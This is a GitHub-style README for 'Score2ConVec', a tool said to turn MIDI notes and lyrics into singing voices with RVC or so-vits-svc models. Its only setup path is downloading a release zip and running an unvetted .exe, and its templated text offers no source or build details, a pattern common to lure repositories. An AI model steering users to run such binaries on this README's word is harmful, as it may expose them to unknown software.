# 🎙️ Score2ConVec - Create singing voices from musical scores

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Osdsoh7817/Score2ConVec/releases)

Score2ConVec allows you to convert MIDI notes and lyrics into realistic singing voices. It works with existing voice models like RVC and so-vits-svc. You can use your computer to generate professional-sounding vocals without recording a human singer. The tool reads your musical input and matches it to a voice model. This brings your digital compositions to life.

## ⚙️ System Requirements

Your computer needs specific hardware and software to run this tool smoothly. 

- **Operating System:** Windows 10 or Windows 11.
- **Processor:** An Intel Core i5 or AMD Ryzen 5 processor from the last four years.
- **Memory:** At least 16 GB of RAM.
- **Graphics Card:** An NVIDIA graphics card with 8 GB of video memory. This component handles the heavy mathematical lifting. If you lack this, the process takes much longer.
- **Storage:** 5 GB of available space on your hard drive.

## 📥 Getting the Application

Visit the link below to reach the release page.

[https://github.com/Osdsoh7817/Score2ConVec/releases](https://github.com/Osdsoh7817/Score2ConVec/releases)

1. Open the link in your web browser.
2. Look for the section labeled "Assets" at the bottom of the latest release.
3. Click the link for the file ending in `.zip`.
4. Your browser downloads the file to your computer.

## 📂 Setting Up the Software

You must extract the files before you can use the program.

1. Open your "Downloads" folder.
2. Find the zip file you just saved.
3. Right-click the file and select "Extract All".
4. Choose a folder where you want to keep the software. You can choose your "Documents" folder or a new folder on your desktop.
5. Click "Extract" to finish.

## 🚀 Running Your First Project

Follow these steps to generate audio.

1. Open the folder you extracted in the previous step.
2. Find the file named `Score2ConVec.exe`.
3. Double-click this file to launch the program. 
4. The application opens a new window. You see a menu with empty slots for your inputs.
5. Load your MIDI file. This file contains the notes for your melody.
6. Input your lyrics. The software maps these syllables to the notes in your MIDI file.
7. Select a voice model. You need an RVC or so-vits-svc voice file. These files end in `.pth`. 
8. Use the "Browse" button to locate your voice file on your hard drive.
9. Adjust the settings for pitch and speed if you want to change the output style.
10. Click the "Generate" button. 

The software processes your files. A progress bar shows you how much time remains. Once the process completes, a new audio file appears in your output folder. You can play this file with any standard media player.

## 🛠️ Troubleshooting Common Issues

Check these items if you have problems.

- **Program does not open:** Ensure you have the latest Microsoft Visual C++ Redistributable installed from the Microsoft website. 
- **Low audio quality:** Verify that your MIDI file is accurate. Notes hitting the wrong time cause the vocals to sound robotic or distorted. Use a clean voice model for the best results.
- **Long processing times:** Close other demanding applications like games or video editors while you run this tool. Processing requires constant access to your graphics card and memory.
- **Missing components:** If the program warns you about missing files, move the folder to a simpler location like `C:\Score2ConVec`. Windows sometimes blocks programs in folders with long or complex paths.

## 📋 Tips for Best Performance

- Use high-quality voice models. A model trained on clean, dry vocals sounds better than a noisy original recording.
- Keep your MIDI files organized. A single MIDI track works best. If your file contains multiple instruments, separate the melody track before you import it.
- Save your work often. Create a backup of your voice models and MIDI files in a separate folder to prevent data loss.
- Monitor your computer temperature. Running intense calculations for a long time generates heat. Ensure your computer has proper ventilation.

## 💡 Understanding Key Concepts

- **MIDI:** This data format stores music instructions, such as which note to play and when to play it. It does not contain actual audio.
- **RVC/so-vits-svc:** These are artificial intelligence frameworks. They learn the unique characteristics of a human voice and apply those traits to new melodies.
- **ContentVec:** This system helps the software understand the linguistic and phonetic structure of your input. It ensures the pronunciation remains clear.
- **Voice Model:** An AI file that acts as a digital version of a human singer.

Keywords: contentvec, deep-learning, pytorch, rvc, singing-voice-conversion, singing-voice-synthesis, so-vits-svc, svc, svs, utau, voice-conversion